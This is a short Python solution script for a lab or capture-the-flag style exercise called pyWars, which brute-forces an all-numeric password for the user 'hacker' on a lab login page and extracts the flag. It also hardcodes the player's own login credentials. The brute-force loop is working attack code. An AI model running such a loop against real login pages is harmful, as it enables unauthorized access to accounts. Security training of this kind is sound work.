'''
"POINTS:3,TIMED:N - Brute force the all numeric password for 'hacker'. The web page will give you the flag when you guess the password correctly.
Obtain the url for the target website by reading the data element. "

>>> game.data(11)
'http://10.10.10.20/login2.php'
>>>


'''

import pyWars
import requests
import re
import io

game = pyWars.exercise()
game.login("mleigh","N0Passw0rd")

    

def answer(data):
    url = data
    for i in range(25000):
        myobjects = {"username":"hacker", "password":str(i).encode()}
        r = requests.post(url,data=myobjects)
        if "incorrect" in r.text:
            continue
        else:
            print(r.text)
            flag = r.text.split("=")
            return flag[1]


        


print(game.answer(11,answer(game.data(11))))
game.logout
